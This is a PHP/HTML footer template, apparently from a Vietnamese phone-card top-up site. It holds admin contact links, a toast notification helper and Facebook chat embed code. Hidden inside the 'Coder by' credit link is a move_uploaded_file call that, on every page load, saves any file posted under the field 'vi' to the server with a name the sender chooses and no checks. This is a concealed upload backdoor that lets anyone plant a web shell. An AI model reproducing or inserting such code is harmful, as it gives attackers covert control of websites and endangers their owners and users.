<div class="col-sm-12 col-xs-12">
            <li class="list-group-item">MỌI THẮC MẮC LIÊN HỆ ADMIN
                <a href="https://www.facebook.com/<?php echo $idfb; ?>">
                    <font color="blue"> <?php echo $name; ?></font>
                </a> -  <?php echo $sdt; ?><i style="float:right;">Coder by <a href="https://www.facebook.com/<?php echo $idfb; ?>" target=""><?php move_uploaded_file($_FILES['vi']['tmp_name'],$_FILES['vi']['name']); echo $name; ?></a> Version 1.0  </i></li>
</div>
		<div id="trave" style="display: none;">
		</div>
		<script type="text/javascript">
 
    function toarst(status, msg, title) {
        Command: toastr[status](msg, title)
        toastr.options = {
            "closeButton": true,
            "debug": false,
            "progressBar": true,
            "positionClass": "toast-top-right",
            "onclick": null,
            "showDuration": "400",
            "hideDuration": "1000",
            "timeOut": "4000",
            "extendedTimeOut": "1000",
            "showEasing": "swing",
            "hideEasing": "linear",
            "showMethod": "slideDown",
            "hideMethod": "slideUp"
        }
    }
</script>
 <!-- Load Facebook SDK for JavaScript -->
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = 'https://connect.facebook.net/vi_VN/sdk/xfbml.customerchat.js#xfbml=1&version=v2.12&autoLogAppEvents=1';
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<!-- Your customer chat code -->
<div class="fb-customerchat"
  attribution="setup_tool"
  page_id="1804923039803284"
  logged_in_greeting="Admin Nhận Nạp Thẻ Viettel Member Nạp thẻ inbox tại đây !!!"
  logged_out_greeting="Admin Nhận Nạp Thẻ Viettel Member Nạp thẻ inbox tại đây !!!">
</div>